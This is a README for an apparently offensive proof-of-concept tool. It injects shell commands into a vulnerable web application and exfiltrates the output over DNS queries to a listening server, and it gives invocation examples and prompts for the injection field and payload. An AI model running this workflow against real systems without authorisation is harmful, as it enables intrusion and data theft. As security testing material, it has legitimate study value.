# DNS Data Exfiltration Project

This project demonstrates a proof-of-concept for data exfiltration using DNS queries. It involves two components: a `client.py` script to send commands and exfiltrate data, and a `server.py` script to receive and decode the exfiltrated data via DNS queries.

## Features

- **Client Script (`client.py`)**: Encodes and sends commands to a vulnerable web application, which then can be used to exfiltrates data over DNS.
- **Server Script (`server.py`)**: Receives the DNS queries and log the queries to be decoded later with dns-parser.py for analysis.
- **DNS Exfiltrate Parser Script (`dns-parser.py`)**: Parses query logs to decode base32 or hex-encoded exfiltrated data.

## Prerequisites

- Python 3.x
- `dnslib` library (install using `pip3 install dnslib`)
- `requests` library (install using `pip3 install requests`)

## Setup and Usage

### Server (`server.py`)

The server script acts as a DNS server that listens for incoming DNS queries and decodes the exfiltrated data.

### 1. Run the DNS server:

By default, the server runs on port 53 (standard DNS port). You can specify a custom port using the `--port` argument.

```bash
python3 server.py --port 53
```
If no port is provided, the script will prompt you to use the default port or enter a custom port.

Example prompt:

```bash
No port provided. Do you want to use the default port 53? (yes/no): yes
```

### Client (client.py)

The client script sends requests to a vulnerable web application, embedding encoded commands that are exfiltrated via DNS queries.

The client script accepts several command-line arguments to customize the payload and its delivery. Below are the details:

--url: (Required) The URL of the vulnerable application.

Example: --url http://vulnerable-app.com/index.php

--method: (Required) The HTTP method to use for the request. Accepted values are GET or POST.

Example: --method POST

--proxy: (Optional) The proxy URL to route the HTTP request through. This can be useful for testing in controlled environments.

Example: --proxy http://127.0.0.1:8080

--server_ip: (Required) The IP address of the DNS server where the exfiltrated data will be sent.

Example: --server_ip 10.45.5.12

--server_port: (Optional) The port number of the DNS server. Defaults to 53 if not specified.

Example: --server_port 8053


### 2. Run the client script:

#### 2.1. Direct execution

You can run the client.py script and passing the inputs as command-line arguments:

```bash
python3 client.py --url http://vulnerable-app.com --method POST --proxy http://127.0.0.1:8080 --server_ip 192.168.1.1 --server_port 53
```

#### 2.2. Interactive execution

Alternatively, you can run the script without arguments and provide the details interactively:

```bash
python3 client.py
```


#### 2.2.1 Interactive Input:

URL: The URL of the vulnerable application.
HTTP Method: Specify GET or POST.
Proxy: (Optional) Specify a proxy URL if required.
DNS Server IP: IP address of the DNS server receiving the exfiltrated data.
DNS Server Port: Port of the DNS server (default is 53).


#### Example prompt:

```bash
Enter the URL of the vulnerable application: http://vulnerable-app.com/index.php
Enter the HTTP method (GET or POST): POST
Enter the proxy URL (e.g., http://127.0.0.1:8080) or leave blank if not using: 
Enter the DNS server IP for exfiltration: 10.45.5.12
Enter the DNS server port (e.g., 53 or 8053): 8053
```

#### Specify the Payload:

Field Injection: The script allows you to specify fields where the payload will be injected. You'll be asked if the field should contain the command injection payload.

Command Input: You can enter multiple commands which will be encoded and sent via the DNS exfiltration technique.

#### Example prompt:

```bash
Enter the payload field to specify (e.g., host): host
Do you want to inject the payload into this field 'host'? (y/n): y
Enter the payload command (e.g., whoami, ls /) or press Enter to exit: whoami
```

The client will send the constructed payloads to the server, exfiltrating data via DNS queries.

The server will receive and decode these queries, providing the exfiltrated data.

### 3. Monitor the server window to see the exfiltrated data.



### Notes

SSL Warnings: The client script disables SSL warnings, but you should be cautious about using this in a production environment.
Fake DNS Response: The server responds with a fake IP address (127.0.0.1) to all DNS queries, as the focus is on capturing and decoding the query data.

### Disclaimer

This project is for educational purposes only. Unauthorized use of these scripts on any system you do not own or have explicit permission to test is illegal and unethical.